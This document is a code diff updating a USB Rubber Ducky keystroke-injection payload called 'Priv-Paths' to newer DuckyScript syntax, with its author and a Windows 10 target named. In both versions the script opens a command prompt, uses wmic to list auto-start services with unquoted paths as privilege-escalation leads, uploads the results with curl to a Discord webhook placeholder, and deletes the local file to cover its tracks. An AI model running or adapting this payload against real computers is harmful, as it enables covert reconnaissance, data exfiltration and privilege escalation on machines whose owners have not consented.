@@ -1,25 +1,20 @@
-REM     Title: Priv-Paths
-REM     Author: atomiczsec
-REM     Description: A payload to enumerate unqouted service paths for privilege escalation and send to a discord webhook.
-REM     Target: Windows 10
+REM_BLOCK
+Title: Priv-Paths
+Author: atomiczsec
+Description: A payload to enumerate unqouted service paths for privilege escalation and send to a discord webhook.
+Target: Windows 10
+END_REM
 
-DELAY 3000
+DEFINE #WEBHOOKURL YOUR-DISCORD-WEBHOOK
+
+DUCKY_LANG US
+DELAY 2000
+DEFAULT_DELAY 500
+
 GUI r 
-DELAY 1000
-STRING cmd 
-ENTER
-DELAY 500
-STRING cd %HOMEPATH%
-ENTER
-DELAY 1000
-STRING wmic service get name, displayname, pathname, startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v ^"^"^" > p.txt
-ENTER
-DELAY 1000
-STRING curl.exe -F "payload_json={\"username\": \"p\", \"content\": \"**Paths**\"}" -F "file=@p.txt" YOUR-DISCORD-WEBHOOK
-ENTER
-DELAY 200
-STRING del p.txt
-ENTER
-DELAY 100
-STRING exit
-ENTER
+STRINGLN cmd 
+STRINGLN cd %HOMEPATH%
+STRINGLN wmic service get name, displayname, pathname, startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v ^"^"^" > p.txt
+STRINGLN curl.exe -F "payload_json={\"username\": \"p\", \"content\": \"**Paths**\"}" -F "file=@p.txt" #WEBHOOKURL
+STRINGLN del p.txt
+STRINGLN exit
